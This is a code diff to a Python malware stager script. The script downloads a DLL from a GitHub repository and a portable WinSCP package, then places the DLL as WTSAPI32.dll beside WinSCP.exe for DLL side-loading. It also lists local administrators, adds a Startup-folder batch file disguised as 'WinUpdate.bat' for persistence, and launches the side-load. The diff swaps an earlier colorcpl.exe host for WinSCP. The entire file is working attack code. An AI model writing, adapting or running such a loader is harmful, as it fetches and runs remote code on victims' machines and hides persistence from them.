@@ -2,20 +2,42 @@ import os
 import shutil
 import subprocess
 import urllib.request
+import zipfile
 
-# ═══════════════════════════════════════════════
+# ===============================================
 # CONFIGURATION
-# ═══════════════════════════════════════════════
-dll_url    = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/dll/colorui.dll"
-dll_path   = r"C:\ProgramData\colorui.dll"
-host_src   = r"C:\Windows\System32\colorcpl.exe"
-host_dst   = r"C:\ProgramData\colorcpl.exe"
-log_path   = r"C:\ProgramData\stage1.log"
+# ===============================================
+dll_url    = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/dll/WTSAPI32.dll"
+app_url    = "https://winscp.net/download/WinSCP-6.5.5-Portable.zip"
+stage_dir  = r"C:\ProgramData"
+app_zip    = os.path.join(stage_dir, "winscp.zip")
+app_dir    = os.path.join(stage_dir, "WinSCP")
+app_exe    = os.path.join(app_dir, "WinSCP.exe")
+dll_path   = os.path.join(app_dir, "WTSAPI32.dll")
+log_path   = os.path.join(stage_dir, "stage1.log")
 bat_name   = "WinUpdate.bat"
 
-# ═══════════════════════════════════════════════
-# PHASE 1: DLL Staging (download as colorui.dll)
-# ═══════════════════════════════════════════════
+# ===============================================
+# PHASE 1: Stage WinSCP (download + extract)
+# ===============================================
+if os.path.exists(app_exe):
+    with open(log_path, 'a') as f:
+        f.write(f"[SKIP] WinSCP already staged at {app_exe}\n")
+else:
+    try:
+        urllib.request.urlretrieve(app_url, app_zip)
+        with zipfile.ZipFile(app_zip, 'r') as z:
+            z.extractall(app_dir)
+        os.remove(app_zip)
+        with open(log_path, 'a') as f:
+            f.write(f"[OK] WinSCP staged to {app_dir}\n")
+    except Exception as e:
+        with open(log_path, 'a') as f:
+            f.write(f"[ERR] WinSCP download failed: {e}\n")
+
+# ===============================================
+# PHASE 2: Stage DLL (as WTSAPI32.dll for side-load)
+# ===============================================
 if os.path.exists(dll_path):
     with open(log_path, 'a') as f:
         f.write(f"[SKIP] DLL already staged at {dll_path}\n")
@@ -23,14 +45,14 @@ else:
     try:
         urllib.request.urlretrieve(dll_url, dll_path)
         with open(log_path, 'a') as f:
-            f.write(f"[OK] DLL staged to {dll_path}\n")
+            f.write(f"[OK] DLL staged as WTSAPI32.dll at {dll_path}\n")
     except Exception as e:
         with open(log_path, 'a') as f:
-            f.write(f"[ERR] Download failed: {e}\n")
+            f.write(f"[ERR] DLL download failed: {e}\n")
 
-# ═══════════════════════════════════════════════
-# PHASE 2: Local Admin Enumeration (always runs)
-# ═══════════════════════════════════════════════
+# ===============================================
+# PHASE 3: Local Admin Enumeration (always runs)
+# ===============================================
 try:
     result = subprocess.run(
         ['net', 'localgroup', 'Administrators'],
@@ -44,29 +66,14 @@ except Exception as e:
     with open(log_path, 'a') as f:
         f.write(f"[ERR] Enumeration failed: {e}\n")
 
-# ═══════════════════════════════════════════════
-# PHASE 3: Host Binary Staging (copy colorcpl.exe)
-# ═══════════════════════════════════════════════
-if os.path.exists(host_dst):
-    with open(log_path, 'a') as f:
-        f.write(f"[SKIP] Host binary already staged at {host_dst}\n")
-else:
-    try:
-        shutil.copy2(host_src, host_dst)
-        with open(log_path, 'a') as f:
-            f.write(f"[OK] Host binary staged: {host_src} -> {host_dst}\n")
-    except Exception as e:
-        with open(log_path, 'a') as f:
-            f.write(f"[ERR] Host binary copy failed: {e}\n")
-
-# ═══════════════════════════════════════════════
-# PHASE 4: Persistence (Startup .bat -> colorcpl.exe)
-# ═══════════════════════════════════════════════
+# ===============================================
+# PHASE 4: Persistence (Startup .bat -> WinSCP.exe)
+# ===============================================
 startup_folder = os.path.expandvars(
     r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 )
 bat_path = os.path.join(startup_folder, bat_name)
-bat_content = f'@echo off\n"{host_dst}"'
+bat_content = f'@echo off\n"{app_exe}"'
 
 if os.path.exists(bat_path):
     with open(log_path, 'a') as f:
@@ -76,18 +83,18 @@ else:
         with open(bat_path, 'w') as f:
             f.write(bat_content)
         with open(log_path, 'a') as f:
-            f.write(f"[OK] Persistence established: Startup .bat -> colorcpl.exe (side-loads colorui.dll)\n")
+            f.write(f"[OK] Persistence: Startup .bat -> WinSCP.exe (side-loads WTSAPI32.dll)\n")
     except Exception as e:
         with open(log_path, 'a') as f:
             f.write(f"[ERR] Startup persistence failed: {e}\n")
 
-# ═══════════════════════════════════════════════
-# PHASE 5: Trigger Side-Load (run colorcpl.exe now)
-# ═══════════════════════════════════════════════
+# ===============================================
+# PHASE 5: Trigger Side-Load (run WinSCP.exe now)
+# ===============================================
 try:
-    subprocess.Popen([host_dst])
+    subprocess.Popen([app_exe])
     with open(log_path, 'a') as f:
-        f.write(f"[OK] Side-load triggered: {host_dst} -> colorui.dll loaded\n")
+        f.write(f"[OK] Side-load triggered: {app_exe} -> WTSAPI32.dll loaded\n")
 except Exception as e:
     with open(log_path, 'a') as f:
         f.write(f"[ERR] Side-load trigger failed: {e}\n")
